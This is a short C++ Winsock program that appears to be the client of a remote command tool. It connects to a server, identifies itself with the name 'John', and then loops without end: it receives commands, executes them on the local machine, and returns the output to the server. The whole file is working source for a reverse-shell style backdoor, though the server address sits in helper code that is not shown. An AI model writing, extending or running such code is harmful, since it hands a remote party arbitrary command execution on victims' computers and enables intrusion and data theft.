#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include "header/headers.h"

#define DEFAULT_BUFLEN 4096

int main(){
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    const char t = 200;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
    
    if (initSocket(&wsaData, &hints)) { // Initialize Winsock
        system("pause");
        return 1;
    }

    initServerSocket(&wsaData, &hints, result, ptr, &ConnectSocket);
    setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, &t, sizeof(t));

    // Send an initial buffer (NAME)
    const char* sendbuf = "John";
    string exec_result = "";
    //Getting command from server
    int sentStatus = 0;
    while (true){
        sentStatus = sendMessageToServer(&ConnectSocket, sendbuf); // Name

        vector<char> message_c = recieveMessage(&ConnectSocket, recvbuf, recvbuflen);
        closesocket(ConnectSocket);
        string str = string(message_c.begin(), message_c.end());

        cout << str; //Command getting
        exec_result = exec(str.c_str());
        initServerSocket(&wsaData, &hints, result, ptr, &ConnectSocket);
        const char* exec_package = exec_result.c_str();
        cout << exec_result << std::endl;

        sentStatus = sendMessageToServer(&ConnectSocket, sendbuf); // name
        Sleep(1000);
        sentStatus = sendMessageToServer(&ConnectSocket, exec_package); //CMD RESULT
    }
    return 0;
}